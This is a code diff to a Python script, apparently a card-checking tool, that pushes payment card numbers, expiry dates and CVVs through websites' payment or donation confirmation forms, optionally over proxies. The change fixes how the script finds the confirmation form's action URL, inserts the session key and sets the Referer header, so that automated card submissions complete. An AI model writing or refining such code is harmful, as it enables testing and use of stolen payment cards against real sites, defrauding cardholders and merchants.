@@ -288,7 +288,7 @@ def extract_confirmation_form(html, soup):
             confirm_form = None
 
     if not confirm_form:
-        return None
+        return None, None
 
     payload = {}
     inputs = confirm_form.find_all('input')
@@ -298,7 +298,9 @@ def extract_confirmation_form(html, soup):
         value = inp.get('value', '')
         if name:
             payload[name] = {'value': value, 'type': input_type}
-    return payload
+            
+    action = confirm_form.get('action')
+    return payload, action
 
 def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=False):
     scheme = get_card_type(ccnum)
@@ -392,11 +394,31 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
                 if input_qfkey: qfkey = input_qfkey.get('value', qfkey)
 
-                # Kita tak perlu extract field lain, sebab build_clean_payload dah hardcoded
-                # confirm_hidden = extract_confirmation_form(response.text, soup_resp)
+                # Extract confirmation form action
+                confirm_hidden, confirm_action = extract_confirmation_form(response.text, soup_resp)
                 
+                # Tentukan URL untuk POST kedua
+                confirm_post_url = form_action
+                if confirm_action:
+                    if confirm_action.startswith('http'):
+                        confirm_post_url = confirm_action
+                    else:
+                        confirm_post_url = urljoin(response.url, confirm_action)
+
+                # Pastikan qfKey berada di dalam URL
+                if 'qfKey=' in confirm_post_url and f'qfKey={qfkey}' not in confirm_post_url:
+                    confirm_post_url = re.sub(r'qfKey=[a-zA-Z0-9]+', f'qfKey={qfkey}', confirm_post_url)
+                elif 'qfKey=' not in confirm_post_url:
+                    if '?' in confirm_post_url: confirm_post_url += f'&qfKey={qfkey}'
+                    else: confirm_post_url += f'?qfKey={qfkey}'
+
+                # Update referer
+                session.headers.update({
+                    "Referer": response.url
+                })
+
                 clean_confirm = build_clean_payload({}, user_data, ccnum, mm, yy, cvv, qfkey, base_url, is_confirm=True)
-                confirm_response = session.post(form_action, data=clean_confirm, timeout=25, allow_redirects=True)
+                confirm_response = session.post(confirm_post_url, data=clean_confirm, timeout=25, allow_redirects=True)
                 
                 logging.info(f"URL Selepas Submit Kedua: {confirm_response.url}")
                 
